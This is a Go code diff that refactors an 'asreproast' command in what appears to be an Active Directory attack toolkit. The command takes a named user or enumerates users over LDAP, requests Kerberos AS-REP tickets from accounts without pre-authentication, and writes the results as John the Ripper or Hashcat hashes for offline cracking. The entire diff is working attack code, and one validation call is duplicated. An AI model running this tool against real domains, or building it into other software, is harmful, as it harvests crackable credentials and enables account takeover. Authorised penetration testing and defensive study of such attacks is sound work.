@@ -2,11 +2,12 @@ package kerberos
 
 import (
 	"fmt"
-	"strings"
+	"os"
 
 	"github.com/spf13/cobra"
 
 	"github.com/vincd/savoir/modules/paquet/krb5"
+	"github.com/vincd/savoir/modules/paquet/krb5/crypto"
 	"github.com/vincd/savoir/modules/paquet/ldap"
 )
 
@@ -14,36 +15,46 @@ func init() {
 	var domain string
 	var ldapUser string
 	var ldapPassword string
-	var username string
 	var enctype string
 	var dcIp string
 	var format string
+	var user string
 	var outputFile string
 
 	var asRepRoastCmd = &cobra.Command{
 		Use:   "asreproast",
 		Short: "Perform AS-REP roasting against specified user(s)",
 		Long:  `Perform AS-REP roasting against specified user(s)`,
-		Args: func(cmd *cobra.Command, args []string) error {
-			if format != "" && format != "john" && format != "hashcat" {
-				return fmt.Errorf("Hash format should be john or hashcat")
+		PreRunE: func(cmd *cobra.Command, args []string) error {
+			if err := validateFormatFlag(format); err != nil {
+				return err
 			}
 
-			if _, ok := encTypeMapping[strings.ToLower(enctype)]; !ok {
-				return fmt.Errorf("enctype value is not valid.")
+			if err := validateETypeFlag(enctype); err != nil {
+				return err
+			}
+
+			if err := validateETypeFlag(enctype); err != nil {
+				return err
+			}
+
+			if len(user) == 0 && len(ldapUser) == 0 {
+				return fmt.Errorf("flag --user or --ldap-user should be set")
 			}
 
 			return nil
 		},
 		RunE: func(cmd *cobra.Command, args []string) error {
-			if len(username) > 0 {
-				tgt, err := krb5.AskTGT(domain, username, "", nil, paramStringToEType(strings.ToLower(enctype)), dcIp, true, false)
-				if err != nil {
-					return err
-				}
+			printDomainInformation(domain, dcIp)
 
-				printTGT(tgt, format, outputFile, false)
-			} else if len(ldapUser) > 0 && len(ldapPassword) > 0 {
+			encType := getETypeFromFlagValue(enctype)
+			// String containing hashes on each line
+			hashes := ""
+			targets := make([]string, 0)
+
+			if len(user) > 0 {
+				targets = append(targets, user)
+			} else {
 				ldapClient, err := ldap.NewLDAPClient()
 				if err != nil {
 					return err
@@ -66,33 +77,56 @@ func init() {
 				}
 
 				for _, entry := range entries {
-					currentUser := entry["sAMAccountName"]
-					fmt.Printf("Found user: %s\n", currentUser)
-
-					tgt, err := krb5.AskTGT(domain, currentUser, "", nil, paramStringToEType(strings.ToLower(enctype)), dcIp, true, false)
-					if err != nil {
-						fmt.Printf("Cannot ask a TGT for the user %s: %s\n", currentUser, err)
-					}
-
-					// Don't save the TGT to kirbi file when using LDAP
-					printTGT(tgt, format, "", false)
+					targets = append(targets, entry["sAMAccountName"])
 				}
+			}
+
+			for _, target := range targets {
+				fmt.Printf("[*] Ask AS-Rep for user %s without pre-authentication\n", target)
+
+				tgt, err := krb5.AskTGT(domain, target, "", nil, encType, dcIp, true, false)
+				if err != nil {
+					fmt.Printf("[!] An error occured: %s\n", err)
+					continue
+				}
+
+				fmt.Printf("[*] Get a valid ticket with encryption: %s\n", crypto.ETypeToString(tgt.EncPart.EType))
+
+				if format == "john" {
+					hashes += fmt.Sprintf("%s\n", tgt.JohnString())
+				} else if format == "hashcat" {
+					hashes += fmt.Sprintf("%s\n", tgt.HashcatString())
+				}
+			}
+
+			if len(hashes) == 0 {
+				fmt.Printf("[!] We found 0 hash...\n")
+				return nil
+			}
+
+			if len(outputFile) == 0 {
+				fmt.Printf("[*] Hashes:\n%s\n", hashes)
 			} else {
-				return fmt.Errorf("Please specify a target user or a valid LDAP creential.")
+				f, err := os.Create(outputFile)
+				if err != nil {
+					return fmt.Errorf("cannot create hash file: %s", err)
+				}
+				defer f.Close()
+
+				f.Write([]byte(hashes))
+				fmt.Printf("[*] Save hashes to: %s\n", outputFile)
 			}
 
 			return nil
 		},
 	}
 
-	asRepRoastCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain to target")
-	asRepRoastCmd.Flags().StringVarP(&ldapUser, "ldap-user", "", "", "Username to connect to LDAP")
-	asRepRoastCmd.Flags().StringVarP(&ldapPassword, "ldap-password", "", "", "Password to connect to LDAP")
-	asRepRoastCmd.Flags().StringVarP(&username, "username", "u", "", "Username to roast")
-	asRepRoastCmd.Flags().StringVarP(&enctype, "enctype", "e", "rc4", "Encryption type: rc4, aes128 or aes256")
-	asRepRoastCmd.Flags().StringVarP(&dcIp, "dc-ip", "", "", "IP of the KDC (Domain controler)")
-	asRepRoastCmd.Flags().StringVarP(&format, "format", "f", "", "Output hash as John the Ripper or Hashcat format (mode 18200)")
-	asRepRoastCmd.Flags().StringVarP(&outputFile, "output", "o", "", "Output the TGT to a kirbi file")
+	commandAddKerberosDomainFlags(asRepRoastCmd, &domain, &dcIp)
+	commandAddLDAPFlags(asRepRoastCmd, &ldapUser, &ldapPassword)
+	commandAddKerberosETypeFlagWithDefaultValue(asRepRoastCmd, &enctype, "rc4")
+	commandAddFormatFlag(asRepRoastCmd, &format)
+	asRepRoastCmd.Flags().StringVarP(&user, "user", "", "", "User to roast")
+	asRepRoastCmd.Flags().StringVarP(&outputFile, "output", "o", "", "Output the hashes to a file")
 
 	Command.AddCommand(asRepRoastCmd)
 }
